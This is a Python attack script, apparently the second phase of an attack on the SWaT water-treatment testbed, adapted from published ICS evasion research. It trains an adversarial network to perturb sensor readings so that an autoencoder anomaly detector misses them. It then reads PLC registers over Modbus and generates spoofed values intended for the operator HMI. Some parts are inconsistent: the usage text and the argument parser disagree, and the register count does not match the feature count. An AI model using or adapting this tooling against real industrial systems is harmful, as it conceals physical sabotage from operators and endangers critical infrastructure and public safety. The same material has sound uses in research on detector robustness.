#!/usr/bin/env python3
"""
phase2_spoof.py — SWaT P1 Attack: Phase 2 - Adversarial Sensor Spoofing
=========================================================================
Based on: Castellanos et al., "Constrained Concealment Attacks against
          Reconstruction-based Anomaly Detectors in ICS", ACSAC 2020 (Paper #31)
          GitHub: https://github.com/scy-phy/ICS-Evasion-Attacks

PURPOSE:
  Extend Phase 1 concealment to EVADE ML-based anomaly detectors.

  Phase 1 replays stored responses — but a naive replay breaks physical
  correlations between sensors (e.g. LIT101 should change if P101 is OFF).
  Paper #31 shows this triggers increasing alarms if <95% of sensors are
  manipulated consistently.

  This phase implements the LEARNING-BASED (black-box) adversarial approach
  from Paper #31 Section 4.2:
    - Train an adversarial autoencoder on normal SWaT sensor timeseries
    - At attack time, compute smallest perturbation to sensor readings that
      minimises the MSE reconstruction error of the target detector
    - Spoof sensor readings with these adversarially crafted values

USAGE:
  # First train the adversarial autoencoder:
  python3 phase2_spoof.py --train --data swat_normal.csv --epochs 100

  # Then run during attack:
  python3 phase2_spoof.py --attack \
      --plc-ip 192.168.1.10 --hmi-ip 192.168.1.20 \
      --iface eth0 --model adv_model.pt

REQUIREMENTS:
  pip install torch numpy pandas scapy pymodbus scikit-learn
"""

import argparse
import os
import time
import pickle
import numpy as np
import pandas as pd
import struct
import threading
from typing import Optional

try:
    import torch
    import torch.nn as nn
    import torch.optim as optim
    from torch.utils.data import DataLoader, TensorDataset
    TORCH_AVAILABLE = True
except ImportError:
    print("[!] PyTorch not installed: pip install torch")
    TORCH_AVAILABLE = False


# ─────────────────────────────────────────────────────────────────────────────
# SWaT P1 Sensor Configuration
# ─────────────────────────────────────────────────────────────────────────────
# P1 sensors (from SWaT dataset — 25 sensors/actuators in full system,
# we focus on P1 subset)
P1_SENSORS = ['FIT101', 'LIT101', 'MV101', 'P101', 'P102']
ALL_SENSORS = [
    # P1
    'FIT101', 'LIT101', 'MV101', 'P101', 'P102',
    # P2
    'AIT201', 'AIT202', 'AIT203', 'FIT201', 'MV201', 'P201',
    'P202', 'P203', 'P204', 'P205', 'P206',
    # P3
    'DPIT301', 'FIT301', 'LIT301', 'MV301', 'MV302', 'MV303',
    'MV304', 'P301', 'P302',
    # ... (add full sensor list from SWaT dataset)
]

WINDOW_SIZE = 10   # Time window for autoencoder input (10 timesteps)
N_FEATURES  = len(P1_SENSORS)  # Using P1 subset for demo


# ─────────────────────────────────────────────────────────────────────────────
# Reconstruction Autoencoder (the TARGET detector we are evading)
# ─────────────────────────────────────────────────────────────────────────────
class ReconstructionAutoencoder(nn.Module):
    """
    Standard reconstruction autoencoder for anomaly detection.
    Trained on normal SWaT sensor data.
    Anomaly score = MSE between input and reconstruction.
    Attack detected if score > threshold.

    This is the detector architecture used in the SWaT BATADAL baseline
    and referenced in Paper #31.
    """
    def __init__(self, n_features: int, window: int, latent_dim: int = 8):
        super().__init__()
        input_dim = n_features * window

        self.encoder = nn.Sequential(
            nn.Linear(input_dim, 64),
            nn.ReLU(),
            nn.Linear(64, 32),
            nn.ReLU(),
            nn.Linear(32, latent_dim),
        )
        self.decoder = nn.Sequential(
            nn.Linear(latent_dim, 32),
            nn.ReLU(),
            nn.Linear(32, 64),
            nn.ReLU(),
            nn.Linear(64, input_dim),
        )

    def forward(self, x):
        # x: (batch, window, features) → flatten
        x_flat = x.view(x.size(0), -1)
        z      = self.encoder(x_flat)
        recon  = self.decoder(z)
        return recon.view(x.size(0), x.size(1), x.size(2))

    def reconstruction_error(self, x: torch.Tensor) -> torch.Tensor:
        """Per-sample MSE reconstruction error."""
        recon = self.forward(x)
        return ((x - recon) ** 2).mean(dim=(1, 2))


# ─────────────────────────────────────────────────────────────────────────────
# Adversarial Autoencoder (Paper #31 Learning-Based Method)
# ─────────────────────────────────────────────────────────────────────────────
class AdversarialAutoencoder(nn.Module):
    """
    Paper #31, Section 4.2 — Learning-Based (Black-Box) Concealment.

    Architecture: encoder → perturbation generator → output
    Trained to output minimal perturbations delta such that:
      AE_detector(x + delta).reconstruction_error ≈ 0  (looks normal)
    Subject to constraint: ||delta||_inf <= epsilon

    Black-box: does NOT require access to detector internals.
    Operates in real-time (milliseconds) meeting Modbus timing constraints.
    """
    def __init__(self, n_features: int, window: int,
                 epsilon: float = 0.1):
        super().__init__()
        self.epsilon = epsilon
        input_dim = n_features * window

        self.perturbation_net = nn.Sequential(
            nn.Linear(input_dim, 128),
            nn.ReLU(),
            nn.Linear(128, 64),
            nn.ReLU(),
            nn.Linear(64, input_dim),
            nn.Tanh(),   # Output in [-1, 1], scaled by epsilon
        )

    def forward(self, x: torch.Tensor) -> torch.Tensor:
        """
        Returns perturbed sensor readings x + delta
        where delta is constrained to [-epsilon, epsilon].
        """
        x_flat = x.view(x.size(0), -1)
        delta_flat = self.perturbation_net(x_flat) * self.epsilon
        delta = delta_flat.view_as(x)
        return x + delta, delta


# ─────────────────────────────────────────────────────────────────────────────
# Training
# ─────────────────────────────────────────────────────────────────────────────
def load_swat_data(csv_path: str, sensors: list, window: int) -> torch.Tensor:
    """
    Load SWaT normal operation data from CSV.
    SWaT dataset available from iTrust:
    https://itrust.sutd.edu.sg/itrust-labs_datasets/dataset_info/
    """
    df = pd.read_csv(csv_path)
    # Keep only sensor columns that exist in file
    available = [s for s in sensors if s in df.columns]
    if not available:
        print(f"[!] No matching sensors found. Available: {list(df.columns)}")
        raise ValueError("No sensor columns found in CSV")

    data = df[available].values.astype(np.float32)

    # Normalise to [0,1]
    data_min = data.min(axis=0)
    data_max = data.max(axis=0)
    data_range = data_max - data_min
    data_range[data_range == 0] = 1   # avoid divide-by-zero
    data = (data - data_min) / data_range

    # Create sliding windows
    windows = []
    for i in range(len(data) - window):
        windows.append(data[i:i+window])
    return torch.tensor(np.array(windows))   # (N, window, features)


def train_detector(data: torch.Tensor, n_features: int, window: int,
                   epochs: int, model_path: str):
    """Train the reconstruction autoencoder detector on normal data."""
    print(f"[*] Training detector on {len(data)} windows...")
    model = ReconstructionAutoencoder(n_features, window)
    optimizer = optim.Adam(model.parameters(), lr=1e-3)
    loader = DataLoader(TensorDataset(data), batch_size=64, shuffle=True)

    for epoch in range(epochs):
        total_loss = 0
        for (batch,) in loader:
            optimizer.zero_grad()
            recon = model(batch)
            loss = nn.MSELoss()(recon, batch)
            loss.backward()
            optimizer.step()
            total_loss += loss.item()
        if (epoch + 1) % 10 == 0:
            print(f"  Epoch {epoch+1}/{epochs}  loss={total_loss/len(loader):.6f}")

    # Compute anomaly threshold (95th percentile of training errors)
    with torch.no_grad():
        errs = model.reconstruction_error(data)
    threshold = float(errs.quantile(0.95))
    print(f"[*] Detector threshold (95th pct): {threshold:.6f}")

    torch.save({'model': model.state_dict(),
                'threshold': threshold,
                'n_features': n_features,
                'window': window}, model_path)
    print(f"[*] Detector saved → {model_path}")
    return model, threshold


def train_adversarial(detector: ReconstructionAutoencoder,
                      data: torch.Tensor,
                      n_features: int, window: int,
                      epsilon: float, epochs: int, adv_path: str):
    """
    Train adversarial autoencoder to generate minimal perturbations
    that fool the detector (Paper #31 Section 4.2).

    Loss = alpha * detector_mse(x+delta)  +  beta * ||delta||_2
           ↑ fool the detector              ↑ keep perturbation small
    """
    print(f"\n[*] Training adversarial autoencoder (epsilon={epsilon})...")
    adv_model = AdversarialAutoencoder(n_features, window, epsilon)
    optimizer  = optim.Adam(adv_model.parameters(), lr=5e-4)
    loader     = DataLoader(TensorDataset(data), batch_size=64, shuffle=True)

    alpha = 1.0   # Weight for detector fooling loss
    beta  = 0.5   # Weight for perturbation minimisation

    for epoch in range(epochs):
        total_loss = 0
        for (batch,) in loader:
            optimizer.zero_grad()
            x_adv, delta = adv_model(batch)

            # Loss 1: make detector think x_adv is normal (low recon error)
            recon_err = detector.reconstruction_error(x_adv).mean()

            # Loss 2: minimise perturbation magnitude
            delta_norm = (delta ** 2).mean()

            loss = alpha * recon_err + beta * delta_norm
            loss.backward()
            optimizer.step()
            total_loss += loss.item()

        if (epoch + 1) % 10 == 0:
            print(f"  Epoch {epoch+1}/{epochs}  "
                  f"loss={total_loss/len(loader):.6f}")

    torch.save({'model': adv_model.state_dict(),
                'epsilon': epsilon,
                'n_features': n_features,
                'window': window}, adv_path)
    print(f"[*] Adversarial model saved → {adv_path}")
    return adv_model


# ─────────────────────────────────────────────────────────────────────────────
# Attack-Time Sensor Spoofing
# ─────────────────────────────────────────────────────────────────────────────
class SensorSpoofingEngine:
    """
    At attack runtime:
    1. Reads real sensor values from PLC (via Modbus)
    2. Applies adversarial perturbations to P1 sensors (LIT101, FIT101)
    3. Returns spoofed values to be replayed to HMI instead of real values

    This extends Phase 1 concealment — instead of replaying static DB values,
    we craft adversarially perturbed values that evade the ML detector.
    """
    def __init__(self, adv_model_path: str, detector_path: str):
        ckpt_adv = torch.load(adv_model_path, weights_only=True)
        ckpt_det = torch.load(detector_path, weights_only=True)

        self.n_features = ckpt_adv['n_features']
        self.window     = ckpt_adv['window']
        self.epsilon    = ckpt_adv['epsilon']
        self.threshold  = ckpt_det['threshold']

        self.adv_model = AdversarialAutoencoder(self.n_features, self.window,
                                                self.epsilon)
        self.adv_model.load_state_dict(ckpt_adv['model'])
        self.adv_model.eval()

        self.detector = ReconstructionAutoencoder(self.n_features, self.window)
        self.detector.load_state_dict(ckpt_det['model'])
        self.detector.eval()

        # Rolling window buffer of recent sensor readings
        self.buffer = []

    def push_reading(self, reading: list):
        """Add a new sensor reading vector to rolling window."""
        self.buffer.append(reading)
        if len(self.buffer) > self.window:
            self.buffer.pop(0)

    def get_spoofed_reading(self) -> Optional[list]:
        """
        Returns adversarially perturbed sensor values.
        Returns None if window not filled yet.
        """
        if len(self.buffer) < self.window:
            return None

        x = torch.tensor([self.buffer], dtype=torch.float32)  # (1, W, F)
        with torch.no_grad():
            x_adv, delta = self.adv_model(x)

        # Check evasion success against our own detector copy
        err_real = float(self.detector.reconstruction_error(x))
        err_adv  = float(self.detector.reconstruction_error(x_adv))

        spoofed = x_adv[0, -1].numpy().tolist()   # Most recent timestep
        print(f"  [~] Sensor spoof: real_err={err_real:.4f} "
              f"adv_err={err_adv:.4f} "
              f"(threshold={self.threshold:.4f}) "
              f"{'EVADES' if err_adv < self.threshold else 'DETECTED'}")
        return spoofed


# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description='Phase 2: Adversarial Sensor Spoofing (Paper #31)')
    subparsers = parser.add_subparsers(dest='mode')

    # Train mode
    tr = subparsers.add_parser('train', help='Train detector + adversarial model')
    tr.add_argument('--data',      required=True, help='SWaT normal data CSV')
    tr.add_argument('--epochs',    type=int, default=100)
    tr.add_argument('--epsilon',   type=float, default=0.1,
                    help='Max perturbation magnitude')
    tr.add_argument('--detector',  default='detector.pt')
    tr.add_argument('--adv-model', default='adv_model.pt')

    # Attack mode
    at = subparsers.add_parser('attack', help='Run adversarial spoofing')
    at.add_argument('--plc-ip',    required=True)
    at.add_argument('--hmi-ip',    required=True)
    at.add_argument('--iface',     default='eth0')
    at.add_argument('--detector',  default='detector.pt')
    at.add_argument('--adv-model', default='adv_model.pt')
    at.add_argument('--duration',  type=int, default=120)

    args = parser.parse_args()
    if not args.mode:
        parser.print_help()
        return

    if not TORCH_AVAILABLE:
        print("[!] PyTorch required. pip install torch")
        return

    if args.mode == 'train':
        print("=" * 60)
        print("  Phase 2: Training Adversarial Models")
        print("=" * 60)
        data = load_swat_data(args.data, P1_SENSORS, WINDOW_SIZE)
        print(f"[*] Loaded {len(data)} windows from {args.data}")

        detector, threshold = train_detector(
            data, N_FEATURES, WINDOW_SIZE, args.epochs, args.detector)

        adv_model = train_adversarial(
            detector, data, N_FEATURES, WINDOW_SIZE,
            args.epsilon, args.epochs, args.adv_model)

        print("\n[*] Training complete.")
        print(f"    Detector  → {args.detector}")
        print(f"    Adv model → {args.adv_model}")

    elif args.mode == 'attack':
        print("=" * 60)
        print("  Phase 2: Adversarial Sensor Spoofing")
        print("  Based on Castellanos et al., ACSAC 2020")
        print("=" * 60)

        engine = SensorSpoofingEngine(args.adv_model, args.detector)
        client = ModbusTcpClient(args.plc_ip, port=502)

        print(f"[*] Spoofing P1 sensors → {args.plc_ip} for {args.duration}s")
        start = time.time()

        while time.time() - start < args.duration:
            try:
                client.connect()
                # Read real sensor values
                result = client.read_holding_registers(
                    REGISTER_MAP['LIT101'], 2)
                if not result.isError():
                    real_vals = result.registers[:N_FEATURES]
                    engine.push_reading(
                        [v / 32767.0 for v in real_vals])  # normalise

                    spoofed = engine.get_spoofed_reading()
                    if spoofed:
                        # In full implementation: intercept and modify
                        # Modbus responses in the MITM stream with
                        # these adversarial values before forwarding to HMI
                        print(f"  [+] Spoofed P1 readings generated")
            except Exception as e:
                print(f"  [!] {e}")
            finally:
                client.close()
            time.sleep(1)

        print("[*] Phase 2 complete.")


# Register map needed in attack mode
try:
    from phase1_inject import REGISTER_MAP
    from pymodbus.client import ModbusTcpClient
except ImportError:
    REGISTER_MAP = {'LIT101': 0x0100}
    try:
        from pymodbus.client import ModbusTcpClient
    except:
        pass

if __name__ == '__main__':
    main()
